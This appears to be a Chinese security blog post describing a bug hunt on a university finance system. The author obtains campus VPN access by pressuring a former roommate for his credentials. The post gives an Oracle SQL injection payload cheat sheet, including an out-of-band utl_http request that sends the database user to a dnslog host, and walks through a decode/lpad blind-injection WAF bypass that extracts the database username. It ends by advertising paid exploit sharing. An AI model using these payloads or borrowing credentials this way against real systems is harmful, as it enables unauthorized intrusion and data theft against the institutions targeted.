#  【漏洞挖掘】记一次985证书站Oracle注入绕WAF   
越南王子  神农Sec   2025-02-12 01:00  
  
扫码加圈子  
  
获内部资料  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/b7iaH1LtiaKWXLicr9MthUBGib1nvDibDT4r6iaK4cQvn56iako5nUwJ9MGiaXFdhNMurGdFLqbD9Rs3QxGrHTAsWKmc1w/640?wx_fmt=jpeg&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/b96CibCt70iaaJcib7FH02wTKvoHALAMw4fchVnBLMw4kTQ7B9oUy0RGfiacu34QEZgDpfia0sVmWrHcDZCV1Na5wDQ/640?wx_fmt=png&wxfrom=13&wx_lazy=1&wx_co=1&tp=wxpic "")  
  
  
#   
  
网络安全领域各种资源，学习文档，以及工具分享、前沿信息分享、POC、EXP分享。  
不定期分享各种好玩的项目及好用的工具，欢迎关注。  
#   
  
原文链接：https://forum.butian.net/share/2996  
  
作者：越南王子  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/iabIwdjuHp2VkevXU9Iiad0pl0dnkk6GmAQNiaqmb1kKX2NGKhaGF7m8UicdyCp9agykgzj7pNN1oEw4b3QLvFbibzQ/640?wx_fmt=png&from=appmsg&wxfrom=13&wx_lazy=1&wx_co=1&tp=wxpic "")  
  
****  
**0x1 前言**  
  
  
看到某985证书挺好看的，我也很想拿一个。碰巧高中舍友是这个学校的，在一番“威逼利诱”下，他也是乖乖地交出了自己的校园VPN账号。  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/iabIwdjuHp2VkevXU9Iiad0pl0dnkk6GmAQNiaqmb1kKX2NGKhaGF7m8UicdyCp9agykgzj7pNN1oEw4b3QLvFbibzQ/640?wx_fmt=png&from=appmsg&wxfrom=13&wx_lazy=1&wx_co=1&tp=wxpic "")  
  
****  
**0x2 发现注入点**  
  
  
1、因为有了VPN账号密码，所以出洞应该不是什么问题。所以我省去了信息收集的步骤，直接登录其教务处、财务处等核心系统测试。最后也是很快地在其财务系统发现了疑似注入点，如下图所示。  
  
![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXHwy8g4XF20AnNOjAAtRibvxqdC6AvgyBVxA06hOsFa96pibvhXTtpgFaUwRyxrksSzKWzX8vsc3fA/640?wx_fmt=png&from=appmsg "")  
  
2、如上图所示，在“支出金额范围（元）”处输入个英文单引号，再点击左上角的“按条件查询”，回显Oracle数据库报错，报错信息为单引号未正确终止。如下图所示。  
  
![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXHwy8g4XF20AnNOjAAtRibvcQQxehLxOrsExpiamMMVaeq46LHZlmBn3b3fOVYaltXoAm7ZEcEekGQ/640?wx_fmt=png&from=appmsg "")  
#   
  
![](https://mmbiz.qpic.cn/mmbiz_png/iabIwdjuHp2VkevXU9Iiad0pl0dnkk6GmAQNiaqmb1kKX2NGKhaGF7m8UicdyCp9agykgzj7pNN1oEw4b3QLvFbibzQ/640?wx_fmt=png&from=appmsg&wxfrom=13&wx_lazy=1&wx_co=1&tp=wxpic "")  
  
****  
**0x3 Oracle注入学习**  
  
****  
**【联合查询注入】**  
```
/?id=1 order by 3 --+ 判断列数
```  
```
/?id=-1 union select null,null,null from dual --+ 获取显位/?id=-1 union select 1,'2','3' from dual --+ 获取显位
```  
```
/?id=-1 union select 1,(select username from all_users where rownum=1),'3' from dual --+  获取用户名（相当于MYSQL的库名）
```  
```
/?id=-1' union select NULL,(select table_name from user_tables where rownum=1 and owner='XXX'),NULL from dual--+ 获取XXX用户下的表名
```  
```
/?id=-1 union select 1,(select column_name from all_tab_columns where owner='XXX' and table_name='USER' and rownum=1),'3' from dual --+ 获取XXX用户下USER表的字段
```  
```
/?id=-1 union select 1,(select concat(concat(username,'~~'),password) from users where rownum=1),null from dual --+ 获取数据
```  
  
**【报错注入】**  
```
/?id=-1' or 1=ctxsys.drithsx.sn(1,'~'%7c%7c(select user from dual)%7c%7c'~') --+
```  
```
/?id=-1' or (select upper(XMLType(chr(60)%7c%7cchr(58)%7c%7c(select user from dual)%7c%7cchr(62))) from dual) is not null --+
```  
```
/?id=-1' or (select dbms_xdb_version.checkin('~'%7c%7c(select user from dual)%7c%7c'~') from dual) is not null--+
```  
  
**【布尔盲注】**  
```
/?id=1 and (select ascii(substr(user,1,1))from dual)>65 --+
```  
  
**【时间盲注】**  
```
/?id=1' and 1=(case when (ascii(substr((select user from dual),1,1))>65) then dbms_pipe.receive_message('RDS',5) else 0 end) --+
```  
  
**【DNSLOG带外注入】**  
```
/?id=1 and utl_http.request('http://'%7c%7c(select user from dual)%7c%7c'.xxxxxx.dnslog.cn/oracle')=1 --+
```  
#   
  
![](https://mmbiz.qpic.cn/mmbiz_png/iabIwdjuHp2VkevXU9Iiad0pl0dnkk6GmAQNiaqmb1kKX2NGKhaGF7m8UicdyCp9agykgzj7pNN1oEw4b3QLvFbibzQ/640?wx_fmt=png&from=appmsg&wxfrom=13&wx_lazy=1&wx_co=1&tp=wxpic "")  
  
****  
**0x4 尝试注入**  
  
  
1、有了上面的笔记，我心想应该很快就能注出来，已经开好漏洞提交的页面准备边注边写报告了，结果payload一贴。。  
  
![467ad7495fa2658f92e5511f852b73fc.jpg](https://mmbiz.qpic.cn/sz_mmbiz_jpg/b7iaH1LtiaKWXHwy8g4XF20AnNOjAAtRibv1IHkzlNhEKeyTypTr86mnDLak8PZficI3ibubSWMEicbxFb0vpibuOzvew/640?wx_fmt=jpeg&from=appmsg "")  
  
2、直接封IP也是难绷。去在线代理池找点免费代理挂上继续测。用上我CTF常年划水的功底，一顿双写大小写编码绕过，但都快把免费IP用完了还是不行。WAF一检测到select、substr、length、instr、ascii等常见函数就会封IP。没办法只能先去搜搜其他师傅的Oracle注入实战贴。发现有decode()这个函数可用。  
```
decode(表达式,value,value1,value2)
```  
  
这个函数的意思是当“表达式”的运算结果等于"value"时，decode函数输出value1；反之若不等，则输出value2。那么我们就可以在“表达式”处逐个字符猜解，结合Oracle除数为0会有特殊报错的特性进行盲注。  
  
![926d64e497da833f9f3803b83f656467.jpg](https://mmbiz.qpic.cn/sz_mmbiz_jpg/b7iaH1LtiaKWXHwy8g4XF20AnNOjAAtRibv9icHMR3o9ia06EoC1C4UPH4S2vicrKR29bWfcR35GZuvNZibkDE9RL8Ueg/640?wx_fmt=jpeg&from=appmsg "")  
  
3、那么问题来了。decode函数里面的盲注表达式该用什么呢？常见的那些根本没得用，掉小珍珠了。只能先去查查Oracle手册，找点不在WAF黑名单里的冷门函数。也是边找边学，最后发现了lpad()这个字符串填充函数似乎可以一试。  
```
lpad(string, padded_length, [pad_string])string: 这是你想要填充的原始字符串。  padded_length: 指定结果字符串的总长度。如果这个长度小于原始字符串的长度，那么原始字符串将被截取到指定长度。  pad_string: （可选）用于填充的字符或字符串。如果未指定，默认使用空格字符进行填充。
```  
  
简单说一下，就是如果当前Oracle用户名为wangzi，那么**lpad(user,1,1)**  
 就为w，**lpad(user,2,1)**  
 就为wa。而**lpad(user,9,6)**  
 将输出666wangzi，填充了pad_string位的字符6到左侧，以让输出的字符串达到九位。  
  
4、最终，我们构造出盲注语句**1/decode(lpad(user,1,1),'A',1,0)**  
 ,将其输入在“支出金额范围（元）”处，并点击查询，发现正常报错回显除数为0。说明当前连接的用户名第一个字符不为A。如图所示。  
  
![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXHwy8g4XF20AnNOjAAtRibvI9rqZaiaZib3NU6A2g6xQYW9hGLiczXcg8blOL4KSuEIFQ5769qjSwF4g/640?wx_fmt=png&from=appmsg "")  
  
5、以此类推，再继续构造盲注语句**1/decode(lpad(user,1,1),'C',1,0)**  
 ,将其输入在“支出金额范围（元）”处，并点击查询，发现报错回显查询结果超过控制数。证明payload运算结果为1，即当前连接的用户名第一个字符为C。若将此处的C换成其他任何字符，回显都是除数为0。如图所示。  
  
![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXHwy8g4XF20AnNOjAAtRibvR1ZKdW0OmhJkaZjTe6l6BTa1nTTlzaLicjRI09s0v94oJRI05IZUvpQ/640?wx_fmt=png&from=appmsg "")  
  
6、再继续构造盲注语句**1/decode(lpad(user,2,1),'CA',1,0)**  
 ,将其输入在“支出金额范围（元）”处，并点击查询，发现报错回显仍是除数为0。说明当前的用户名第二个字符不为A。如图所示。  
  
![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXHwy8g4XF20AnNOjAAtRibvzP2chicOxe8SiclHkK0qjo44t4p6aNb5SZ9e9vicRX07KHWDiaWibpc6YpQ/640?wx_fmt=png&from=appmsg "")  
  
7、如此以来不断遍历字符测试，直到构造出**1/decode(lpad(user,2,1),'CW',1,0)**  
 。将其输入在“支出金额范围（元）”处，并点击查询，发现报错回显的是查询结果超过控制数。证明payload运算结果为1，即当前连接的用户名第二个字符为W。若将此处的W换成其他任何字符，回显都是除数为0。如图所示。  
  
![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXHwy8g4XF20AnNOjAAtRibvjE7cgeIGxATLj8Esa4kxLa1tsFyicKNDNnqh6Mib0kiapMUibyiardRojmA/640?wx_fmt=png&from=appmsg "")  
  
8、同理，构造 **1/decode(lpad(user,3,1),'CWB',1,0)**  
 和**1/decode(lpad(user,4,1),'CWBS',1,0)**  
 时，回显不是除数为0，而是查询结果超过控制数。故我们通过盲注，成功得到了该Oracle数据库当前连接的用户名，即CWBS。遍历其它任何字符，盲注第五位的回显都是除数为0，故用户名只有4位。漏洞验证成功！  
  
![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXHwy8g4XF20AnNOjAAtRibvQ614ZW2wiayxAUeFb5uHa28s3FvY4CdtyXQmxjnqGxO2hxsVeKY4vBg/640?wx_fmt=png&from=appmsg "")  
#   
  
![](https://mmbiz.qpic.cn/mmbiz_png/iabIwdjuHp2VkevXU9Iiad0pl0dnkk6GmAQNiaqmb1kKX2NGKhaGF7m8UicdyCp9agykgzj7pNN1oEw4b3QLvFbibzQ/640?wx_fmt=png&from=appmsg&wxfrom=13&wx_lazy=1&wx_co=1&tp=wxpic "")  
  
****  
**0x5 总结**  
  
  
因为这里的数据包是被全局加密的，而且WAF封得严，所以没能用BP或者脚本进行快速遍历字符进行盲注。不过弄到大半夜也算是勉强注出来了，坐等证书发货。若有不够严谨的地方，还请师傅们批评指正。  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/iabIwdjuHp2VkevXU9Iiad0pl0dnkk6GmAQNiaqmb1kKX2NGKhaGF7m8UicdyCp9agykgzj7pNN1oEw4b3QLvFbibzQ/640?wx_fmt=png&from=appmsg&wxfrom=13&wx_lazy=1&wx_co=1&tp=wxpic "")  
  
****  
**0x6 内部圈子详情介绍**  
  
我们是  
神农安全  
，点赞 + 在看  
 铁铁们点起来，最后祝大家都能心想事成、发大财、行大运。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/mngWTkJEOYJDOsevNTXW8ERI6DU2dZSH3Wd1AqGpw29ibCuYsmdMhUraS4MsYwyjuoB8eIFIicvoVuazwCV79t8A/640?wx_fmt=png&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/MVPvEL7Qg0F0PmZricIVE4aZnhtO9Ap086iau0Y0jfCXicYKq3CCX9qSib3Xlb2CWzYLOn4icaWruKmYMvqSgk1I0Aw/640?wx_fmt=gif&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
**内部圈子介绍**  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/MVPvEL7Qg0F0PmZricIVE4aZnhtO9Ap08Z60FsVfKEBeQVmcSg1YS1uop1o9V1uibicy1tXCD6tMvzTjeGt34qr3g/640?wx_fmt=gif&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
  
  
**圈子专注于更新src/红蓝攻防相关：**  
  
```
1、维护更新src专项漏洞知识库，包含原理、挖掘技巧、实战案例
2、知识星球专属微信“小圈子交流群”
3、微信小群一起挖洞
4、内部团队专属EDUSRC证书站漏洞报告
5、分享src优质视频课程（企业src/EDUSRC/红蓝队攻防）
6、分享src挖掘技巧tips
7、不定期有众测、渗透测试项目（一起挣钱）
8、不定期有工作招聘内推（工作/护网内推）
9、送全国职业技能大赛环境+WP解析（比赛拿奖）
```  
  
  
  
  
**内部圈子**  
**专栏介绍**  
  
知识星球内部共享资料截屏详情如下  
  
（只要没有特殊情况，每天都保持更新）  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWYcoLuuFqXztiaw8CzfxpMibRSekfPpgmzg6Pn4yH440wEZhQZaJaxJds7olZp5H8Ma4PicQFclzGbQ/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWYcoLuuFqXztiaw8CzfxpMibgpeLSDuggy2U7TJWF3h7Af8JibBG0jA5fIyaYNUa2ODeG1r5DoOibAXA/640?wx_fmt=png&from=appmsg "")  
  
  
**知识星球——**  
**神农安全**  
  
神农安全团队创建的知识星球一直从未涨价，永久价格40  
  
（新人优惠卷20，扫码或者私信我即可领取）  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWVsxbULEhU6VQ8Oax3kWlkSg0OGhRI7Ep3Bx4QMicCjuZicJqicfeeA4wjUzyF6jkQ2GvQ0k4ibicuOic0g/640?wx_fmt=png&from=appmsg "")  
  
  
**欢迎加入星球一起交流，券后价仅40元！！！ 即将满300人涨价**  
  
**长期更新，更多的0day/1day漏洞POC/EXP**  
  
****  
****  
**神农安全公开交流群**  
  
有需要的师傅们直接扫描文章二维码加入，然后要是后面群聊二维码扫描加入不了的师傅们，直接扫描文章开头的二维码加我（备注加群）  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWUFHRFrovMmVsgNgErMUkzSxDyjjgbIxnpydTnErGWicrELxeRL9mWpD2zaWaoPgMMDiapyQC423nxQ/640?wx_fmt=png&from=appmsg "")  
  
****  
    
```
```  
  
  
  
  
